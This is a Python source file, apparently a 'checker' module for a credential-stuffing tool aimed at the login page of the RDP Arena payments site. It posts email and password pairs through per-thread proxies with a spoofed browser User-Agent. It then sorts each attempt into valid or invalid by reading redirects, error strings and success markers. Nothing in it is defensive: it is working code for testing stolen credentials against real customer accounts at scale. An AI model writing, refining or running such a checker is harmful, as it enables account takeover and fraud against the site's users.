"""
Checker for RDP Arena – Debug version with better error detection.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://www.rdparena.com/"
LOGIN_URL = BASE_URL + "payments/login"
TIMEOUT = 15

# Set to True to see full response body
DEBUG = True

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": BASE_URL
    })

    try:
        payload = {"email": email, "password": password}
        response = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT, allow_redirects=False)

        if DEBUG:
            print(f"[DEBUG] Status: {response.status_code}")
            print(f"[DEBUG] Headers: {response.headers}")
            print(f"[DEBUG] Cookies: {session.cookies.get_dict()}")
            print(f"[DEBUG] Body (full):")
            print(response.text)   # Print everything

        # ---------- Success detection ----------

        # 1. Redirect – success
        if response.status_code in (301, 302):
            location = response.headers.get("Location", "")
            if "login" in location.lower() or "signin" in location.lower():
                return False, f"Redirected back to login: {location}"
            return True, f"Login successful (redirect to {location})"

        # 2. HTTP 200 – inspect content
        if response.status_code == 200:
            html = response.text.lower()
            title = "title" in html and html.split("<title>")[1].split("</title>")[0] if "<title>" in html else ""

            # --- Error messages (WHMCS style) ---
            error_patterns = [
                "invalid email", "invalid login", "incorrect email", "incorrect login",
                "authentication failed", "credentials are incorrect", "wrong password",
                "login failed", "account not found", "inactive account", "your account is suspended"
            ]
            has_error = any(pattern in html for pattern in error_patterns)

            # --- Success indicators ---
            success_patterns = ["dashboard", "logout", "welcome", "account", "my account", "profile"]
            has_success = any(pattern in html for pattern in success_patterns)

            # --- Presence of login form ---
            has_login_form = 'name="password"' in html or 'type="password"' in html

            # --- Decision ---
            if has_success:
                return True, "Login successful (content marker)"
            if has_error:
                return False, "Login failed (error message found)"
            if has_login_form and not has_success:
                # Still on login page, but no explicit error – likely a failure
                return False, "Login failed (login form still present, no success indicator)"
            # Check for session cookie as a weak indicator
            if session.cookies.get_dict():
                # But we already saw that the cookie is set even before login.
                # So we should only trust this if we also see a success indicator,
                # but we already checked that. So we can ignore.
                pass
            # If we are still here, ambiguous
            return False, "Login response ambiguous (treated as failure)"

        # 3. Other status codes
        else:
            return False, f"HTTP {response.status_code}: {response.reason}"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"